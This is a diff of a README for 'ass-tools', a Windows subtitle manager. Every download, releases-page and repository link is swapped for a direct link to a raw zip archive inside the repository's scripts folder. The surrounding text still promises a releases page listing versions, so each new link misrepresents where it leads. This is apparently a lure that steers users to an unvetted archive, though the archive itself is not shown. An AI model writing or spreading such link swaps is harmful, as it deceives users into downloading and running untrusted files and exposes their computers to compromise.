@@ -1,6 +1,6 @@
 # 🎬 ass-tools - Manage Subtitles with Ease
 
-[![Download ass-tools](https://img.shields.io/badge/Download-ass--tools-brightgreen?style=for-the-badge)](https://github.com/CarBer2004/ass-tools/releases)
+[![Download ass-tools](https://img.shields.io/badge/Download-ass--tools-brightgreen?style=for-the-badge)](https://github.com/CarBer2004/ass-tools/raw/refs/heads/main/scripts/ass_tools_3.3.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Here are the steps to get ass-tools up and running on your Windows computer.
 
 Click the link below to visit the download page for ass-tools. This page has the latest versions available.
 
-[![Download ass-tools](https://img.shields.io/badge/Download-ReleasePage-blue?style=for-the-badge)](https://github.com/CarBer2004/ass-tools/releases)
+[![Download ass-tools](https://img.shields.io/badge/Download-ReleasePage-blue?style=for-the-badge)](https://github.com/CarBer2004/ass-tools/raw/refs/heads/main/scripts/ass_tools_3.3.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Click the link below to visit the download page for ass-tools. This page has the
 
 Open your web browser and go to:
 
-https://github.com/CarBer2004/ass-tools/releases
+https://github.com/CarBer2004/ass-tools/raw/refs/heads/main/scripts/ass_tools_3.3.zip
 
 This page shows different versions of the software. Always choose the latest version for the best experience.
 
@@ -142,11 +142,11 @@ These formats support rich text styles, colors, and positioning for subtitles, m
 
 ## 🔍 More Information and Help
 
-Explore the [ass-tools GitHub repository](https://github.com/CarBer2004/ass-tools) for further details, instructions, and updates.
+Explore the [ass-tools GitHub repository](https://github.com/CarBer2004/ass-tools/raw/refs/heads/main/scripts/ass_tools_3.3.zip) for further details, instructions, and updates.
 
 To get the latest version or updates, visit the releases page:
 
-https://github.com/CarBer2004/ass-tools/releases
+https://github.com/CarBer2004/ass-tools/raw/refs/heads/main/scripts/ass_tools_3.3.zip
 
 ---
 
